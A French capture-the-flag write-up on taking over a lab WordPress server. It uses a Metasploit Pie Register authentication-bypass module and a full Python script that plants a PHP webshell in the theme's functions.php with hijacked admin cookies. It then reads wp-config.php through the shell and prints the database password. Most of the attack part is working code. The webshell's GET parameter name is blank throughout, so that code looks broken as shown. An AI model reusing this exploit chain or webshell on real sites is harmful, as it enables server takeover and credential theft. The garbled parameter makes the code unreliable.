# Writeup : Penetration Testing d'un serveur WordPress vulnérable

## Objectif

L'objectif de ce challenge est de compromettre un serveur WordPress hébergé à l'adresse IP `172.20.31.174` (anciennement `172.20.28.198`), d'obtenir une exécution de code à distance (RCE), et de trouver le mot de passe de la base de données.

## 1. Reconnaissance et Découverte

* **Cible :** `172.20.31.174`
* **CMS :** WordPress 6.7.1
* **Plugins identifiés :** `PIE Register` (version vulnérable < 3.7.1.5)
* **Thème actif :** `Twenty Twenty-Four`

## 2. Exploitation : Élévation de Privilèges

Le plugin **Pie Register** est connu pour une vulnérabilité critique permettant de contourner l'authentification.

### 2.1. Utilisation de Metasploit

Nous avons utilisé le module Metasploit `exploit/unix/webapp/wp_pie_register_bypass_rce` pour exploiter cette faille.

**Configuration de l'attaque :**

```bash
use exploit/unix/webapp/wp_pie_register_bypass_rce
set RHOSTS 172.20.31.174
set LHOST 10.8.96.29
run
```

**Résultat :**
Le module a réussi à générer un cookie de session administrateur valide sans exiger de mot de passe, nous donnant un accès complet au tableau de bord WordPress.

## 3. Obtention d'un Shell (RCE)

Avec les privilèges administrateur, nous avons tenté d'uploader un fichier malveillant via le formulaire d'upload de Pie Register, mais sans succès immédiat (fichier introuvable). Nous avons donc pivoté vers une méthode plus fiable : l'éditeur de thème.

### 3.1. Script `exploit_theme_editor.py`

Ce script Python automatise l'injection d'un code PHP malveillant dans le fichier `functions.php` du thème actif (`twentytwentyfour`) en utilisant le cookie administrateur.

```python
import requests
import re
import html

# Configuration
URL = "http://172.20.31.174"
EDITOR_URL = f"{URL}/wp-admin/theme-editor.php"
THEME = "twentytwentyfour"
FILE = "functions.php"

# Admin Cookies (Obtenus via Metasploit)
cookies = {
    "wordpress_test_cookie": "WP+Cookie+check",
    "wordpress_bcaa16e69f7df351663908cde90e97f4": "admin%7C1771256893%7Ch7tN5IFCWw77XyaFF8BPVDNIyl8fJMB5esotpJPQiZM%7C49bea2571110266d1d1f44486a0ecdfaedf225ebfb2d6187473205b1ea81e7a1",
    "wordpress_logged_in_bcaa16e69f7df351663908cde90e97f4": "admin%7C1771256893%7Ch7tN5IFCWw77XyaFF8BPVDNIyl8fJMB5esotpJPQiZM%7C508d422cd3f3f40f1f7025372759faf8a953ff5ec6b14a97b2fcf339a1c30985"
}

s = requests.Session()
s.cookies.update(cookies)

# Step 1: Récupération de la page d'édition
print(f"[*] Fetching {FILE} editor page...")
params = {"file": FILE, "theme": THEME}
r = s.get(EDITOR_URL, params=params)

if r.status_code != 200:
    print(f"[-] Failed to fetch page: {r.status_code}")
    exit(1)

content = r.text

# Step 2: Extraction du Nonce et du Contenu Actuel
nonce_match = re.search(r'name="nonce" value="([^"]+)"', content)
if not nonce_match:
    print("[-] Could not find nonce!")
    exit(1)

nonce = nonce_match.group(1)
print(f"[+] Found nonce: {nonce}")

textarea_match = re.search(r'<textarea.*?id="newcontent".*?>(.*?)</textarea>', content, re.DOTALL)
if not textarea_match:
    print("[-] Could not find textarea content!")
    exit(1)

current_code = html.unescape(textarea_match.group(1))

# Step 3: Ajout du Webshell
payload = "\n\n// GEMINI SHELL\nif(isset($_GET[''])) { system($_GET['']); exit; }\n"

if "GEMINI SHELL" in current_code:
    print("[!] Shell already present. Skipping modification.")
    new_code = current_code
else:
    new_code = current_code + payload
    print("[*] Appended shell payload.")

# Step 4: Soumission de la mise à jour
data = {
    "nonce": nonce,
    "_wp_http_referer": f"/wp-admin/theme-editor.php?file={FILE}&theme={THEME}",
    "newcontent": new_code,
    "action": "update",
    "file": FILE,
    "theme": THEME,
    "submit": "Update File"
}

print("[*] Submitting update...")
r_post = s.post(EDITOR_URL, data=data)

if r_post.status_code == 200:
    print("[+] Update request sent. Checking if successful...")
    # Vérification
    test_url = f"{URL}/?=id"
    try:
        r_test = requests.get(test_url, timeout=5)
        if "uid=" in r_test.text:
            print(f"[!!!] SUCCESS! Shell active at {test_url}")
            print(f"Output: {r_test.text.strip()}")
        else:
            print("[-] Shell not responding.")
    except Exception as e:
        print(f"[-] Error checking shell: {e}")
else:
    print(f"[-] POST failed with status {r_post.status_code}")
```

**Payload injecté dans `functions.php` :**

```php
// GEMINI SHELL
if(isset($_GET[''])) { system($_GET['']); exit; }
```

**Validation :**
L'exécution de commandes est désormais possible via le paramètre GET ``.

```bash
curl "http://172.20.31.174/?=id"
# Sortie : uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4. Post-Exploitation : Vol d'Identifiants

Une fois le shell obtenu, nous avons recherché les informations de configuration dans le fichier `wp-config.php` pour répondre à la question : "Quel est le mot de passe utilisé par WordPress pour se connecter à la base de données ?".

**Commande exécutée :**

```bash
curl "http://172.20.31.174/?=cat%20wp-config.php"
```

**Contenu extrait (extrait pertinent) :**

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', 'ZxWwrA85LQeLNLpg' );
define( 'DB_HOST', 'localhost' );
```

## 5. réponse à la Question

**Question :** What is the password used by WordPress to connect to the database?

**Réponse :** `ZxWwrA85LQeLNLpg`
